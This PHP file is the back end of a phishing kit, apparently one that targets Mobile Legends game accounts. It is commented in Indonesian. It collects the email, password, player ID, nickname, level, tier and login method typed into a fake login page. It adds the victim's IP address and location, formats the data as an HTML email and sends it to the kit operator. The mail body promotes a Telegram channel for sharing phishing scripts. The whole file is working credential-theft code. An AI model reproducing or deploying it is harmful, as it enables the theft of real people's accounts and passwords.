<?php

include 'system/setting.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$nick = $_POST['nickname'];
$playid = $_POST['playid'];
$zone = $_POST['zone'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $nick == "" && $playid == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "$arpantek_flag | $arpantek_callingcode | LEVEL $level | LOGIN $login | PUNYA SI $email |";
$pesan = '
<center> 
<div style="background: url(https://i.ibb.co/5K3s0Vv/arpantek-banner-v2.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Account Information</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="width: 78%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>NICKNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$nick.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="width: 78%; text-align: center;"><b>'.$level.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ACCOUNT TIER</th>
<th style="width: 78%; text-align: center;"><b>'.$tier.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Additional Information</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>IP ADDRESS</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_ip_address.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CONTINENT</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_continent.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_country.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_region.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_city.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN TIME</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<a style="background-image: linear-gradient(#179CDE, #0088CC); width: 55%; margin-top: 10px; margin-left: auto; margin-right: auto; padding: 6px; color: #fff; font-size: 15px; text-align: center; text-transform: uppercase; text-decoration: none; border-radius: 3px; outline: none; display: block;" href="https://t.me/berbagiscphisingml">Find Me on Telegram</a>
</div>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);
}
?>